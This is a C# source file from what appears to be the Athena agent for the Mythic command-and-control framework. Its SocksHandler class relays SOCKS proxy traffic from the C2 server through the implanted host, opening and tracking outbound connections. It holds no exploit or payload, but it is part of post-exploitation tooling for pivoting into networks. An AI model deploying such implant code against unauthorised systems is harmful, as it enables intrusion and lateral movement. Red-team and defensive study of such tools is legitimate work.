using Athena.Models.Athena.Commands;
using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using GodSharp.Sockets;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{
    //Try using this library for next rewrite
    //https://github.com/godsharp/GodSharp.Socket/blob/master/samples/GodSharp.Socket.TcpClientSample/Program.cs
    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, AthenaSocksConnection> connections { get; set; }
        //private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
        private object _lock = new object();
        public bool running { get; set; }

        public SocksHandler()
        {
            this.running = false;
            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
        }

        /// <summary>
        /// Start the SOCKS Listener
        /// </summary>
        public async Task<bool> Start()
        {
            this.ct = new CancellationTokenSource();
            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();

            return true;
        }

        /// <summary>
        /// Stops the SOCKS Listener
        /// </summary>
        public async Task<bool> Stop()
        {
            if (!this.running)
            {
                return true;
            }

            this.running = false;

            if (this.ct is not null)
            {
                this.ct.Cancel();
            }

            return true;
        }

        /// <summary>
        /// Add a connection to the tracker dictionary
        /// </summary>
        /// <param name="conn">Socks Connection</param>
        public async Task<bool> AddConnection(AthenaSocksConnection conn)
        {
            return this.connections.TryAdd(conn.server_id, conn);
        }

        /// <summary>
        /// Remove connection from the tracker dictionary
        /// </summary>
        /// <param name="conn">Connection ID</param>
        public async Task<bool> RemoveConnection(int conn)
        {
            return this.connections.TryRemove(conn, out _);
        }
        /// <summary>
        /// Handle a new message forwarded from the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public async Task HandleMessage(SocksMessage sm)
        {

            if (!this.connections.ContainsKey(sm.server_id))
            {
                await HandleNewConnection(sm);
                return;
            }

            if (!this.connections[sm.server_id].IsConnectedOrConnecting())
            {
                await RemoveConnection(sm.server_id);

                await SocksResponseHandler.AddSocksMessageAsync(new SocksMessage(sm.server_id, new byte[] { }, true));
                return;
            }

            this.connections[sm.server_id].client.Connection.Send(Misc.Base64DecodeToByteArray(sm.data));
        }

        /// <summary>
        /// Handle a new connection forwarded from the Mythic server
        /// </summary>
        /// <param name="address">IP address</param>
        /// <param name="sm">Socks Message</param>
        private async Task HandleNewConnection(SocksMessage sm)
        {
            try
            {
                if (String.IsNullOrEmpty(sm.data))
                {
                    return;
                }

                ConnectionOptions co = new ConnectionOptions(sm); //Create new ConnectionOptions

                if (co.failed)
                {
                    ReturnMessageFailure(co.server_id);
                    return;
                }

                AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object, and try to connect.
                sc.HandleSocksEvent += ReturnSocksMessage;
                sc.client.Start();
                await AddConnection(sc); //Add our connection to the Dictionary;
                
            } 
            catch (Exception e)
            {
                ReturnMessageFailure(sm.server_id);
            }
        }

        public async void ReturnMessageFailure(int id)
        {
            await SocksResponseHandler.AddSocksMessageAsync(
                new SocksMessage(
                    id, 
                    new ConnectResponse{
                            bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                            bndport = new byte[] { 0x00, 0x00 },
                            status = ConnectResponseStatus.GeneralFailure,
                    }.ToByte(),
                    true
                ));
        }

        private async void ReturnSocksMessage(object sender, SocksEventArgs e)
        {
            await SocksResponseHandler.AddSocksMessageAsync(e.sm);
        }
    }
}